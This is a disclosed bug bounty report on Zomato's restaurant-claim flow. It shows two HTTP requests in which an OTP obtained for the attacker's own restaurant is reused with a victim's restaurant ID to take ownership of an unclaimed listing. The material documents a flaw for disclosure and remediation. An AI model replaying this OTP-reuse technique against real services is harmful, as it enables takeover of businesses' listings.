# Claiming the listing of a non-delivery restaurant through OTP manipulation

## Report Details
- **Report ID**: 1330529
- **URL**: https://hackerone.com/reports/1330529
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-09-05T07:32:05.745Z
- **Disclosed**: 2022-02-22T08:51:15.229Z

## Reporter
- **Username**: ashoka_rao
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
**Summary:** Am able to claim any restaurant which is not claimed before.

**Description:** An endpoint `POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2` sends OTP to the restaurant mobile no.

##Request (Request:1) is - 
```
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}
```
which responses -
```
{"status":"success","message":"OTP SENT","requestId":XXXXXXX,"code":2}
```

###Here Attacker gains OTP on his own mobile no by changing the `number` & `resId` to his own restaurant.

By using the following request (Request:2) attacker is able to map his e-mail Id as `Owner / Manager` to Victim restaurant.
##Request:2
```
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXX
Content-Length: 68
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Accept: application/json, text/plain, */*
X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.zomato.com/partner_with_us/ownership
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"XXXXXXXXX"}
```

###Here by changing the `verificationCode`  -  (Otp received on Attacker Mobile in response of Request :1 )& `requestId`  (Response of request:1) and `resId` to Victim Restaurant. Request:2 maps e-mail id of Attacker to Victim restaurant.

**Prerequisite - Attacker should have a restaurant page, mapped Mobile No With Email Id.**

**Note : -  If any restaurant is not mapped owner / manager then claimed restaurant can be claimed **

## Impact

Claim a restaurant.

## Attachments
No attachments
